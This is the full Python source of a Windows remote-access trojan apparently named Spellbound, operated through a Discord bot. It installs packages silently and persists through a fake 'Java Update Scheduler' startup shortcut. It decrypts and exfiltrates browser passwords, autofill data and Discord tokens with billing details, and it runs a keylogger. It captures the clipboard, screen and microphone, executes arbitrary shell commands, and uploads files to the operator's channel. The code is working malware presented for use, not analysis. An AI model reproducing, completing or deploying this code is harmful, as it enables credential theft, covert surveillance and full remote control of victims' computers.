import os
import re
import uuid
import json
import wave
import ctypes
import base64
import random
import string
import socket
import shutil
import sqlite3
import platform
import threading
import subprocess

version = "3.7"

# _____________________________________________________________________________________________________________________________________ #
# ===================================================================================================================================== #
def GetPython():
    commands = ["py", "python", "python3"]
    for cmd in commands:
        try:
            result = subprocess.run([cmd, "--version"], capture_output=True, text=True, check=True, creationflags=subprocess.CREATE_NO_WINDOW)
            return cmd
        except (subprocess.CalledProcessError, FileNotFoundError):
            continue
    return None

def InstallPackages(packages):
    pythonCmd = GetPython()
    for package in packages:
        subprocess.run([pythonCmd, "-m", "pip", "install", package], capture_output=True, text=True, check=True, creationflags=subprocess.CREATE_NO_WINDOW)

InstallPackages(packages=["requests", "pycryptodome", "pyautogui", "pyperclip", "discord.py", "pynput", "pyaudio"])

import pyaudio
import discord
import requests
import pyperclip
import pyautogui

from Crypto.Cipher import AES
from pynput.keyboard import Key, Listener

# _____________________________________________________________________________________________________________________________________ #
# ===================================================================================================================================== #
BOT_TOKEN = "%"  # %


# _____________________________________________________________________________________________________________________________________ #
# ===================================================================================================================================== #
LOCALAPPDATA = os.getenv('LOCALAPPDATA')
ROAMING = os.getenv('APPDATA')

userPath = f"C:\\Users\\{os.getlogin()}"
binPath = f"C:\\Users\\{os.getlogin()}\\bin"

shortcutPath = f"C:\\Users\\{os.getlogin()}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
scriptPath = os.path.abspath(__file__)

if not os.path.exists(binPath):
    os.mkdir(binPath)

# _____________________________________________________________________________________________________________________________________ #
# ===================================================================================================================================== #
discordRegexp = r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}"
discordRegexpEnc = r"dQw4w9WgXcQ:[^\"]*"
discordTokens = []
discordUIDS = []
discordCommonPaths = {'Discord': ROAMING + '\\discord\\Local Storage\\leveldb\\','Discord Canary': ROAMING + '\\discordcanary\\Local Storage\\leveldb\\','Lightcord': ROAMING + '\\Lightcord\\Local Storage\\leveldb\\','Discord PTB': ROAMING + '\\discordptb\\Local Storage\\leveldb\\','Opera': ROAMING + '\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\','Opera GX': ROAMING + '\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\','Amigo': LOCALAPPDATA + '\\Amigo\\User Data\\Local Storage\\leveldb\\','Torch': LOCALAPPDATA + '\\Torch\\User Data\\Local Storage\\leveldb\\','Kometa': LOCALAPPDATA + '\\Kometa\\User Data\\Local Storage\\leveldb\\','Orbitum': LOCALAPPDATA + '\\Orbitum\\User Data\\Local Storage\\leveldb\\','CentBrowser': LOCALAPPDATA + '\\CentBrowser\\User Data\\Local Storage\\leveldb\\','7Star': LOCALAPPDATA + '\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\','Sputnik': LOCALAPPDATA + '\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\','Vivaldi': LOCALAPPDATA + '\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\','Chrome SxS': LOCALAPPDATA + '\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\','Chrome': LOCALAPPDATA + '\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\','Chrome1': LOCALAPPDATA + '\\Google\\Chrome\\User Data\\Profile 1\\Local Storage\\leveldb\\','Chrome2': LOCALAPPDATA + '\\Google\\Chrome\\User Data\\Profile 2\\Local Storage\\leveldb\\','Chrome3': LOCALAPPDATA + '\\Google\\Chrome\\User Data\\Profile 3\\Local Storage\\leveldb\\','Chrome4': LOCALAPPDATA + '\\Google\\Chrome\\User Data\\Profile 4\\Local Storage\\leveldb\\','Chrome5': LOCALAPPDATA + '\\Google\\Chrome\\User Data\\Profile 5\\Local Storage\\leveldb\\','Epic Privacy Browser': LOCALAPPDATA + '\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\','Microsoft Edge': LOCALAPPDATA + '\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb\\','Uran': LOCALAPPDATA + '\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\','Yandex': LOCALAPPDATA + '\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\','Brave': LOCALAPPDATA + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\','Iridium': LOCALAPPDATA + '\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\'}

browsersPasswords = []
browserAutofill = []
chromiumBrowsers = [{"name": "Google Chrome", "path": os.path.join(LOCALAPPDATA, "Google", "Chrome", "User Data"), "taskname": "chrome.exe"},{"name": "Microsoft Edge", "path": os.path.join(LOCALAPPDATA, "Microsoft", "Edge", "User Data"), "taskname": "msedge.exe"},{"name": "Opera", "path": os.path.join(ROAMING, "Opera Software", "Opera Stable"), "taskname": "opera.exe"},{"name": "Opera GX", "path": os.path.join(ROAMING, "Opera Software", "Opera GX Stable"), "taskname": "opera.exe"},{"name": "Brave", "path": os.path.join(LOCALAPPDATA, "BraveSoftware", "Brave-Browser", "User Data"), "taskname": "brave.exe"},{"name": "Yandex", "path": os.path.join(ROAMING, "Yandex", "YandexBrowser", "User Data"), "taskname": "yandex.exe"},]
chromiumSubpaths = [{"name": "None", "path": ""},{"name": "Default", "path": "Default"},{"name": "Profile 1", "path": "Profile 1"},{"name": "Profile 2", "path": "Profile 2"},{"name": "Profile 3", "path": "Profile 3"},{"name": "Profile 4", "path": "Profile 4"},{"name": "Profile 5", "path": "Profile 5"},]

keyloggerStatut = False
keyloggerPressedKeys = []

cmdDirectory = ""

# ______________________________________________________________________________________________________________________________________________ #
# ================================================================ UTILITY ===================================================================== #
def GetChannelName():
    return f"{os.getlogin().lower()}-{'-'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) for elements in range(0, 2 * 6, 2)][::-1])}"

def GetRandomString(length: int) -> str:
    return ''.join(random.choices(string.ascii_letters, k=length))

def SafeRemove(path):
    try:
        if os.path.exists(path):
            os.remove(path)
    except Exception as e:
        pass

def KillProcess(processName):
    result = subprocess.run(["tasklist"], capture_output=True, text=True, creationflags=subprocess.CREATE_NO_WINDOW)
    if processName not in result.stdout:
        return
    subprocess.run(["taskkill", "/F", "/IM", processName], capture_output=True, text=True, check=True, creationflags=subprocess.CREATE_NO_WINDOW)

def AddPersistance():
    iconPath = f"{binPath}\\icon.ico"
    subprocess.run(["curl", "https://raw.githubusercontent.com/JuanaCOrtiz/test-rep/refs/heads/main/java.ico", "-o", iconPath], capture_output=True, text=True, creationflags=subprocess.CREATE_NO_WINDOW)
    psCmd = f"""
$s=(New-Object -COM WScript.Shell).CreateShortcut('{shortcutPath}\\Java Update Scheduler.lnk');
$s.TargetPath='{scriptPath}';
$s.IconLocation='{iconPath}';
$s.Save()
"""
    subprocess.run(["powershell", "-Command", psCmd], capture_output=True, text=True, check=True, creationflags=subprocess.CREATE_NO_WINDOW)


# _____________________________________________________________________________________________________________________________________ #
# ===================================================================================================================================== #
def GetClipboard():
    return f"Last item copied :\n```{pyperclip.paste()}```"

def RecordMicro(duration=10, filePath=""):
    format = pyaudio.paInt16
    channels = 2
    rate = 44100
    chunk = 1024
    audio = pyaudio.PyAudio()
    stream = audio.open(format=format, channels=channels, rate=rate, input=True, frames_per_buffer=chunk)
    frames = []
    for _ in range(0, int(rate / chunk * duration)):
        data = stream.read(chunk)
        frames.append(data)
    stream.stop_stream()
    stream.close()
    audio.terminate()
    with wave.open(filePath, 'wb') as wf:
        wf.setnchannels(channels)
        wf.setsampwidth(audio.get_sample_size(format))
        wf.setframerate(rate)
        wf.writeframes(b''.join(frames))

# ____________________________________________________________________________________________________________________________________________________ #
# ========================================================== DISCORD FUNCS =========================================================================== #
def ValidateToken(token: str) -> bool:
    r = requests.get('https://discord.com/api/v9/users/@me', headers={'Authorization': token})
    if r.status_code == 200: 
        return True
    return False

def DecryptVal(buff: bytes, master_key: bytes) -> str:
    iv = buff[3:15]
    payload = buff[15:]
    cipher = AES.new(master_key, AES.MODE_GCM, iv)
    decrypted_pass = cipher.decrypt(payload)
    decrypted_pass = decrypted_pass[:-16].decode()
    return decrypted_pass

def GetMasterKey(path: str) -> str:
    if not os.path.exists(path):
        return None
    if 'os_crypt' not in open(path, 'r', encoding='utf-8').read():
        return None

    with open(path, "r", encoding="utf-8") as f:
        local_state = json.load(f)

    master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    master_key = master_key[5:]

    class DATA_BLOB(ctypes.Structure):
        _fields_ = [("cbData", ctypes.c_ulong), ("pbData", ctypes.POINTER(ctypes.c_ubyte))]

    pDataIn = DATA_BLOB(len(master_key), ctypes.cast(master_key, ctypes.POINTER(ctypes.c_ubyte)))
    pDataOut = DATA_BLOB()

    if ctypes.windll.Crypt32.CryptUnprotectData(ctypes.byref(pDataIn), None, None, None, None, 0, ctypes.byref(pDataOut)):
        decrypted_key = bytes((ctypes.c_ubyte * pDataOut.cbData).from_address(ctypes.addressof(pDataOut.pbData.contents)))
        ctypes.windll.kernel32.LocalFree(pDataOut.pbData)
        return decrypted_key

def GetDiscordTokens():
    for name, path in discordCommonPaths.items():
        if not os.path.exists(path): continue
        _discord = name.replace(" ", "").lower()
        if "cord" in path:
            if not os.path.exists(ROAMING + f'\{_discord}\Local State'): continue
            for file_name in os.listdir(path):
                if file_name[-3:] not in ["log", "ldb"]: continue
                for line in [x.strip() for x in open(f'{path}\{file_name}', errors='ignore').readlines() if x.strip()]:
                    for y in re.findall(discordRegexpEnc, line):
                        token = DecryptVal(base64.b64decode(y.split('dQw4w9WgXcQ:')[1]), GetMasterKey(ROAMING + f'\{_discord}\Local State'))

                        if ValidateToken(token):
                            uid = requests.get('https://discord.com/api/v9/users/@me', headers={'Authorization': token}).json()['id']
                            if uid not in discordUIDS:
                                discordTokens.append(token)
                                discordUIDS.append(uid)

        else:
            for file_name in os.listdir(path):
                if file_name[-3:] not in ["log", "ldb"]: continue
                for line in [x.strip() for x in open(f'{path}\{file_name}', errors='ignore').readlines() if x.strip()]:
                    for token in re.findall(discordRegexp, line):
                        if ValidateToken(token):
                            uid = requests.get('https://discord.com/api/v9/users/@me', headers={'Authorization': token}).json()['id']
                            if uid not in discordUIDS:
                                discordTokens.append(token)
                                discordUIDS.append(uid)

def ExtractInfosFromToken():
    if not discordTokens:
        return

    final_to_return = []
    for token in discordTokens:
        user = requests.get('https://discord.com/api/v8/users/@me', headers={'Authorization': token}).json()
        billing = requests.get('https://discord.com/api/v6/users/@me/billing/payment-sources', headers={'Authorization': token}).json()

        username = user['username'] + '#' + user['discriminator']
        user_id = user['id']
        email = user['email']
        phone = user['phone']
        mfa = user['mfa_enabled']

        if user['premium_type'] == 0:
            nitro = 'None'
        elif user['premium_type'] == 1:
            nitro = 'Nitro Classic'
        elif user['premium_type'] == 2:
            nitro = 'Nitro'
        elif user['premium_type'] == 3:
            nitro = 'Nitro Basic'
        else:
            nitro = 'None'

        if billing:
            payment_methods = []
            for method in billing:
                if method['type'] == 1:
                    payment_methods.append('Credit Card')
                elif method['type'] == 2:
                    payment_methods.append('PayPal')
                else:
                    payment_methods.append('Unknown')
            payment_methods = ', '.join(payment_methods)
        else:
            payment_methods = None

        final_message = (f'\nUsername: {username} ({user_id})'
                         f'\nToken: {token}'
                         f'\nNitro: {nitro}'
                         f'\nBilling: {payment_methods if payment_methods != "" else "None"}'
                         f'\nMFA: {mfa}'
                         f'\nEmail: {email if email != None else "None"}'
                         f'\nPhone: {phone if phone != None else "None"}'
                         f'\n==============')
        final_to_return.append(final_message)

    return final_to_return

# _____________________________________________________________________________________________________________________________________________________ #
# ================================================================= CHROMIUM FUNCS ==================================================================== #
def DecryptData(data, key):
    try:
        iv = data[3:15]
        data = data[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        return cipher.decrypt(data)[:-16].decode()
    except:
        try:
            class DATA_BLOB(ctypes.Structure):
                _fields_ = [("cbData", ctypes.c_ulong), ("pbData", ctypes.POINTER(ctypes.c_ubyte))]

            pDataIn = DATA_BLOB(len(data), ctypes.cast(data, ctypes.POINTER(ctypes.c_ubyte)))
            pDataOut = DATA_BLOB()

            if ctypes.windll.Crypt32.CryptUnprotectData(
                ctypes.byref(pDataIn),
                None,
                None,
                None,
                None,
                0,
                ctypes.byref(pDataOut)
            ):
                decrypted_data = bytes((ctypes.c_ubyte * pDataOut.cbData).from_address(ctypes.addressof(pDataOut.pbData.contents)))
                ctypes.windll.kernel32.LocalFree(pDataOut.pbData)
                return decrypted_data.decode()

        except Exception as e:
            return f"Failed to decrypt data: {e}"

def ExtractPasswords():
    for browser in chromiumBrowsers:
        KillProcess(browser['taskname'])
        local_state_path = os.path.join(browser['path'], 'Local State')
        if not os.path.exists(local_state_path):
            continue

        with open(local_state_path, 'r', encoding='utf-8') as f:
            local_state = json.load(f)

        try:
            key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
            
            class DATA_BLOB(ctypes.Structure):
                _fields_ = [("cbData", ctypes.c_ulong), ("pbData", ctypes.POINTER(ctypes.c_ubyte))]

            pDataIn = DATA_BLOB(len(key), ctypes.cast(key, ctypes.POINTER(ctypes.c_ubyte)))
            pDataOut = DATA_BLOB()

            if ctypes.windll.Crypt32.CryptUnprotectData(
                ctypes.byref(pDataIn), None, None, None, None, 0, ctypes.byref(pDataOut)
            ):
                decryption_key = bytes((ctypes.c_ubyte * pDataOut.cbData).from_address(ctypes.addressof(pDataOut.pbData.contents)))
                ctypes.windll.kernel32.LocalFree(pDataOut.pbData)
            else:
                raise ValueError("Failed to decrypt master key.")
        except Exception as e:
            print(f"Error decrypting master key: {e}")
            continue

        for subpath in chromiumSubpaths:
            login_data_path = os.path.join(browser['path'], subpath['path'], 'Login Data')
            if not os.path.exists(login_data_path):
                continue

            try:
                temp_db = os.path.join(browser['path'], subpath['path'], f"{browser['name']}-pw.db")
                shutil.copy(login_data_path, temp_db)

                connection = sqlite3.connect(temp_db)
                cursor = connection.cursor()
                query_passwords = "SELECT origin_url, username_value, password_value FROM logins"
                cursor.execute(query_passwords)

                for row in cursor.fetchall():
                    origin_url = row[0]
                    username = row[1]
                    encrypted_password = row[2]
                    password = DecryptData(encrypted_password, decryption_key)

                    if username or password:
                        browsersPasswords.append(
                            {
                                "url": origin_url,
                                "username": username,
                                "password": password,
                            }
                        )

                cursor.close()
                connection.close()
                os.remove(temp_db)

            except Exception as e:
                continue

def ExtractAutofill():
    for browser in chromiumBrowsers:
            KillProcess(browser["name"])
            browser_path = browser["path"]
            if not os.path.exists(browser_path):
                continue

            for profile in chromiumSubpaths:
                profile_path = os.path.join(browser_path, profile["path"])
                web_data_path = os.path.join(profile_path, "Web Data")

                if os.path.exists(web_data_path):
                    temp_copy = web_data_path + "_temp"
                    shutil.copy2(web_data_path, temp_copy)

                    try:
                        conn = sqlite3.connect(temp_copy)
                        cursor = conn.cursor()

                        cursor.execute("SELECT name FROM sqlite_master WHERE type='table';")
                        tables = [table[0] for table in cursor.fetchall()]
                        if "autofill" in tables:
                            cursor.execute("SELECT name, value FROM autofill")
                            autofills = cursor.fetchall()

                            for autofill in autofills:
                                autofill_entry = (
                                    f'Name: {autofill[0]}\n'
                                    f'Value: {autofill[1]}\n'
                                    f"Browser: {browser['name']}\n"
                                    '==============\n'
                                )
                                browserAutofill.append(autofill_entry)

                        conn.close()
                    except sqlite3.Error as e:
                        pass
                    finally:
                        os.remove(temp_copy)


# ______________________________________________________________________________________________________________________________________________________ #
# ================================================================= KEYLOGGER FUNCS ==================================================================== #
def OnPress(key):
    global keyloggerPressedKeys, keyloggerStatut

    if not keyloggerStatut:
        return

    keyCodes = {
        Key.space: ' ',
        Key.shift: ' [SHIFT] ',
        Key.tab: ' [TAB] ',
        Key.backspace: ' [DEL] ',
        Key.esc: ' [ESC] ',
        Key.caps_lock: ' [CAPS LOCK] ',
        Key.enter: ' [ENTER] ',
        Key.shift_r: " [SHIFT] "
    }
    
    try:
        if key.char:
            keyloggerPressedKeys.append(key.char)
        else:
            keyloggerPressedKeys.append(keyCodes.get(key, f' [{key}] '))
    except AttributeError:
        keyloggerPressedKeys.append(keyCodes.get(key, f' [{key}] '))

def KeyloggerThread():
    with Listener(on_press=OnPress) as listen:
        listen.join()


# __________________________________________________________________________________________________________________________________________________ #
# =============================================================== DISCORD BOT ====================================================================== #
class Client(discord.Client):

    # ____________________________________________________________________________________________________________________________________________________ #
    # ============================================================== CHANNEL SETUP ======================================================================= #
    @staticmethod
    async def on_ready():
        for guild in client.guilds:
            channel_name = GetChannelName()
            existing_channel = discord.utils.get(guild.text_channels, name=channel_name)

            if existing_channel is None:
                new_channel = await guild.create_text_channel(GetChannelName())
                embed = discord.Embed(description=f":wireless: **{os.getlogin()}** Connected with `Spellbound v{version}`", color=discord.Color.blue())
                await new_channel.send(embed=embed)
            else:
                embed = discord.Embed(description=f":wireless: **{os.getlogin()}** Connected with `Spellbound v{version}`", color=discord.Color.blue())
                await existing_channel.send(embed=embed)

        # __________________________________________________________________________________________________________________________________________________ #
        # =================================================================== PERSISTANCE ================================================================== #
        

        # ____________________________________________________________________________________________________________________________________________________ #
        # ================================================================= HACKS THREADS ==================================================================== #
        KEYLOGGER_THREAD = threading.Thread(target=KeyloggerThread)
        KEYLOGGER_THREAD.start()


    # _________________________________________________________________________________________________________________________________________________ #
    # ===================================================================== COMMUNICATIONS ================================================================ #
    async def on_message(self, message):
        global keyloggerStatut, keyloggerPressedKeys, cmdDirectory

        if message.author == self.user:
            return
        
        channel = message.channel
        if channel.name == GetChannelName():
            # ____________________________________________________________________________________________________________________________________________ #
            # =================================================================== .ping ================================================================== #
            if message.content == ".ping":
                await message.delete()
                
                embed = discord.Embed(description=f":wireless: **{os.getlogin()}** Connected with `Spellbound v{version}`", color=discord.Color.blue())
                await message.channel.send(embed=embed)

            # _____________________________________________________________________________________________________________________________________________ #
            # ====================================================================== .clear =============================================================== #
            elif message.content == ".cl" or message.content == ".clear":
                await message.channel.purge()

            # ____________________________________________________________________________________________________________________________________________ #
            # ================================================================== .kill =================================================================== #
            elif message.content.startswith(".kill"):
                await message.delete()

                command = message.content.split(" ")

                try:
                    KillProcess(command[1])
                    embed = discord.Embed(description=f":white_check_mark: Process `{command[1]}` terminated !", color=discord.Color.purple())
                    await message.channel.send(embed=embed)
                except:
                    embed = discord.Embed(description=f":no_entry: Cannot terminate process `{command[1]}`", color=discord.Color.red())
                    await message.channel.send(embed=embed)

            # _________________________________________________________________________________________________________________________________________________ #
            # ================================================================== .clipboard =================================================================== #
            elif message.content == ".cb" or message.content == ".clipboard":
                await message.delete()
                
                clipboard = GetClipboard()

                if clipboard != "":
                    embed = discord.Embed(description=clipboard, color=discord.Color.purple())
                    await message.channel.send(embed=embed)
                else:
                    embed = discord.Embed(description=f":warning: Empty clipboard !", color=discord.Color.yellow())
                    await message.channel.send(embed=embed)

            # _____________________________________________________________________________________________________________________________________________________ #
            # ================================================================= .grab autofill ==================================================================== #
            elif message.content == ".grab autofill":
                await message.delete()
                
                embed = discord.Embed(description=":incoming_envelope: Uploading... This action may take time !", color=discord.Color.yellow())
                await message.channel.send(embed=embed)

                ExtractAutofill()

                filePath = f"{binPath}/{GetRandomString(17)}.txt"
                with open(filePath, "w") as f:
                    for autofill in browserAutofill:
                        f.write(autofill)

                fileEmbed = discord.File(filePath, filename=f"{os.getlogin()} - Auto-fill.txt")
                await message.channel.send(file=fileEmbed)

                SafeRemove(filePath)

            # ____________________________________________________________________________________________________________________________________________________ #
            # =================================================================== .grab discord ================================================================== #
            elif message.content == ".grab discord":
                await message.delete()
                
                embed = discord.Embed(description=":incoming_envelope: Uploading... This action may take time !", color=discord.Color.yellow())
                await message.channel.send(embed=embed)

                GetDiscordTokens()
                tokens = ExtractInfosFromToken()

                filePath = f"{binPath}/{GetRandomString(17)}.txt"
                with open(filePath, "w") as f:
                    for token in tokens:
                        f.write(token)

                fileEmbed = discord.File(filePath, filename=f"{os.getlogin()} - Discord Tokens.txt")
                await message.channel.send(file=fileEmbed)

                SafeRemove(filePath)

            # _____________________________________________________________________________________________________________________________________________________ #
            # =================================================================== .grab password ================================================================== #
            elif message.content == ".grab password" or message.content == ".grab passwords":
                await message.delete()
                
                embed = discord.Embed(description=":incoming_envelope: Uploading... This action may take time !", color=discord.Color.yellow())
                await message.channel.send(embed=embed)

                ExtractPasswords()
                formatted = ""
                for entry in browsersPasswords:
                    formatted += (
                        f"URL:            {entry['url']}\n"
                        f"Username:       {entry['username']}\n"
                        f"Password:       {entry['password']}\n"
                        f"==============\n")

                filePath = f"{binPath}/{GetRandomString(17)}.txt"
                with open(filePath, "w") as f:
                    f.write(formatted)

                fileEmbed = discord.File(filePath, filename=f"{os.getlogin()} - Passwords.txt")
                await message.channel.send(file=fileEmbed)

                SafeRemove(filePath)

            # _______________________________________________________________________________________________________________________________________________ #
            # =================================================================== .grab pc ================================================================== #
            elif message.content == ".grab pc":
                await message.delete()
                
                embed = discord.Embed(description=":incoming_envelope: Uploading... This action may take time !", color=discord.Color.yellow())
                await message.channel.send(embed=embed)

                requInfos = requests.get('https://ipinfo.io')
                data = requInfos.json()

                session = os.getlogin()
                computer_name = socket.gethostname()
                osVersion = platform.system() + " " + platform.release()
                architecture = platform.machine()
                mac = ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) for elements in range(0, 2 * 6, 2)][::-1])
                ip = data.get('ip')
                country = data.get('country')
                region = data.get('region')
                city = data.get('city')
                loc = data.get('loc')
                org = data.get('org')

                filePath = f"{binPath}/{GetRandomString(17)}.txt"
                with open(filePath, "w") as f:
                    f.write(f"""
Session: {session}
Computer Name: {computer_name}
OS Version: {osVersion}
Architecture: {architecture}
MAC: {mac}
IP: {ip}
Country: {country}
Region: {region}
City: {city}
Localisation: {loc}
Internet Provider: {org}
""")

                fileEmbed = discord.File(filePath, filename=f"{os.getlogin()} - PC Infos.txt")
                await message.channel.send(file=fileEmbed)

                SafeRemove(filePath)

            # __________________________________________________________________________________________________________________________________________________ #
            # =================================================================== .screenshot ================================================================== #
            elif message.content == ".ss" or message.content == ".screenshot":
                await message.delete()

                embed = discord.Embed(description=":incoming_envelope: Uploading... This action may take time !", color=discord.Color.yellow())
                await message.channel.send(embed=embed)
                
                filePath = f"{binPath}/{GetRandomString(17)}.png"
                screenshot = pyautogui.screenshot()
                screenshot.save(filePath)

                fileEmbed = discord.File(filePath, filename=f"{os.getlogin()} - Screenshot.png")
                await message.channel.send(file=fileEmbed)

                SafeRemove(filePath)

            # _________________________________________________________________________________________________________________________________________________ #
            # =================================================================== .keylogger ================================================================== #
            elif message.content == ".start keylogger":
                await message.delete()

                if keyloggerStatut:
                    embed = discord.Embed(description=f":no_entry: Keylogger already **ON** : use `.stop keylogger`", color=discord.Color.red())
                    await message.channel.send(embed=embed)
                    return
                
                keyloggerStatut = True
                embed = discord.Embed(description=f":warning: Keylogger has started, now listening...", color=discord.Color.yellow())
                await message.channel.send(embed=embed)

            elif message.content == ".stop keylogger":
                await message.delete()

                if not keyloggerStatut:
                    embed = discord.Embed(description=f":no_entry: Keylogger already **OFF** : use `.start keylogger`", color=discord.Color.red())
                    await message.channel.send(embed=embed)
                    return

                embed = discord.Embed(description=f":warning: Keylogger is stopped !", color=discord.Color.yellow())
                await message.channel.send(embed=embed)
                keyloggerStatut = False

                embed = discord.Embed(description=":incoming_envelope: Uploading... This action may take time !", color=discord.Color.yellow())
                await message.channel.send(embed=embed)
                
                filePath = f"{binPath}/{GetRandomString(17)}.txt"
                finalMessage = ""
                for key in keyloggerPressedKeys:
                    finalMessage += key
                with open(filePath, "w") as f:
                    f.write(finalMessage)

                fileEmbed = discord.File(filePath, filename=f"{os.getlogin()} - Keylogger Logs.txt")
                await message.channel.send(file=fileEmbed)

                SafeRemove(filePath)

            # __________________________________________________________________________________________________________________________________________ #
            # =================================================================== .cd ================================================================== #
            elif message.content.startswith(".cd"):
                await message.delete()

                command = message.content.split(" ")

                try:
                    os.chdir(command[1])
                    cmdDirectory = os.getcwd()
                    embed = discord.Embed(description=f"Current working directory changed to `{os.getcwd()}`", color=discord.Color.green())
                    await message.channel.send(embed=embed)
                except:
                    embed = discord.Embed(description=f":no_entry: Unkown directory : `{command[1]}`", color=discord.Color.red())
                    await message.channel.send(embed=embed)

            # _____________________________________________________________________________________________________________________________________________ #
            # =================================================================== .shell ================================================================== #
            elif message.content.startswith(".shell") or message.content.startswith(".sh"):
                await message.delete()

                command = message.content.split(" ")

                try:
                    finalCommand = ["cmd", "/c"]
                    finalCommand.extend(command[1:])

                    result = subprocess.run(finalCommand, capture_output=True, text=True, creationflags=subprocess.CREATE_NO_WINDOW, encoding="cp850")
                    if result != "":
                        embed = discord.Embed(description=f"Command executed successfully :\n```{result.stdout.strip()}```", color=discord.Color.purple())
                    else:
                        embed = discord.Embed(description=f"Command executed successfully", color=discord.Color.purple())
                        
                    await message.channel.send(embed=embed)
                except Exception as e:
                    embed = discord.Embed(description=f":no_entry: Unexpected error : `{e}`", color=discord.Color.red())
                    await message.channel.send(embed=embed)

            # _____________________________________________________________________________________________________________________________________________ #
            # =================================================================== .voice ================================================================== #
            elif message.content == ".vc" or message.content == ".voice":
                await message.delete()
                
                embed = discord.Embed(description=":microphone2: Recording... This action may take time !", color=discord.Color.yellow())
                await message.channel.send(embed=embed)

                filePath = f"{binPath}/{GetRandomString(17)}.wav"
                RecordMicro(filePath=filePath)

                embed = discord.Embed(description=":incoming_envelope: Uploading... This action may take time !", color=discord.Color.yellow())
                await message.channel.send(embed=embed)

                fileEmbed = discord.File(filePath, filename=f"{os.getlogin()} - Recorded.wav")
                await message.channel.send(file=fileEmbed)

                SafeRemove(filePath)

            # ________________________________________________________________________________________________________________________________________________ #
            # =================================================================== .download ================================================================== #
            elif message.content.startswith(".download"):
                await message.delete()

                command = message.content.split(" ")
                if not os.path.exists(command[1]):
                    embed = discord.Embed(description=":no_entry: Invalid file path", color=discord.Color.red())
                    await message.channel.send(embed=embed)
                    return

                embed = discord.Embed(description=":incoming_envelope: Uploading... This action may take time !", color=discord.Color.yellow())
                await message.channel.send(embed=embed)

                filePath = command[1]
                fileEmbed = discord.File(filePath, filename=f"{os.getlogin()} - {os.path.basename(filePath)}")
                await message.channel.send(file=fileEmbed)

            # _____________________________________________________________________________________________________________________________________________________ #
            # =================================================================== unkown command ================================================================== #
            elif message.content.startswith("."):
                await message.delete()

                embed = discord.Embed(description=f":no_entry: Unkown command `{message.content}`", color=discord.Color.red())
                await message.channel.send(embed=embed)
                


AddPersistance()

intents = discord.Intents.default()
intents.message_content = True
client = Client(intents=intents)
client.run(BOT_TOKEN)